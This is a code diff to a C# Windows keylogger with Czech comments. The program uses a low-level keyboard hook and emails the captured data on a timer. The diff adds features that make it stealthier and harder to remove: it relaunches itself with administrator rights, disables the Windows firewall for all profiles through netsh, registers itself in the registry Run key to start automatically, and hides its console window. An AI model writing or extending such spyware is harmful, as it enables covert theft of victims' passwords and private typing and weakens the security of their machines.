@@ -10,25 +10,42 @@ using System.Net.Mail;
 
 using System.Threading;
 
+using Microsoft.Win32;
+
 namespace keylogger
 {
     class Program
     {
-        private const int WH_KEYBOARD_LL = 13; // povolí monitorovat vstupu z klávesnice
+        private const int WH_KEYBOARD_LL = 13; // povolí monitorovat vstupy z klávesnice
         private const int WM_KEYDOWN = 0x0100; // stisknutí nesystémové klávesy (není stisknuta klávesa ALT)
         private static LowLevelKeyboardProc _proc = HookCallback; // zavolá se pokaždé, když se stiskne klávesa
         private static IntPtr _hookID = IntPtr.Zero;
 
         public static void Main()
         {
-            //thread for sending data
+            // run app as admin
+            if (!Program.IsAdministrator())
+            {
+                var exeName = Process.GetCurrentProcess().MainModule.FileName;
+                ProcessStartInfo startInfo = new ProcessStartInfo(exeName);
+                startInfo.Verb = "runas";
+                startInfo.Arguments = "restart";
+                Process.Start(startInfo);
+                Application.Exit();
+            }
+
+            // turn off firewall true - off, false - on
+            TurnOffFirewall(true);
+
+            // auto startup
+            AutoRun();
+
+            // thread for sending data
             var t = new Thread(() => sendEmail(20000));
             t.Start();
 
             var handle = GetConsoleWindow();
-
-            // Hide
-            //ShowWindow(handle, SW_HIDE);
+            ShowWindow(handle, SW_HIDE); // hide window
 
             _hookID = SetHook(_proc);
             Application.Run();
@@ -120,6 +137,48 @@ namespace keylogger
                     Console.WriteLine(ex);
                 }
             }
+        }
+
+        private static void AutoRun()
+        {
+            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            key.DeleteValue(Application.ProductName, false);
+
+            if (key.GetValue(Application.ProductName) == null)
+            {
+                key.SetValue(Application.ProductName, Application.ExecutablePath);
+            }
+            else
+            {
+                if (!key.GetValue(Application.ProductName).Equals(Application.ExecutablePath))
+                {
+                    key.SetValue(Application.ProductName, Application.ExecutablePath);
+                }
+            }
+        }
+
+        private static bool IsAdministrator()
+        {
+            WindowsIdentity identity = WindowsIdentity.GetCurrent();
+            WindowsPrincipal principal = new WindowsPrincipal(identity);
+            return principal.IsInRole(WindowsBuiltInRole.Administrator);
+        }
+
+        private static void TurnOffFirewall(bool status)
+        {
+            Process process = new Process
+            {
+                StartInfo = {
+                    Verb = "runas",
+                    FileName = "netsh",
+                    Arguments = "advfirewall set allprofiles state " + ((status) ? "off" : "on"),
+                    UseShellExecute = false,
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    RedirectStandardOutput = true
+                }
+            };
+            process.Start();
+            process.WaitForExit();
         }
     }
 }
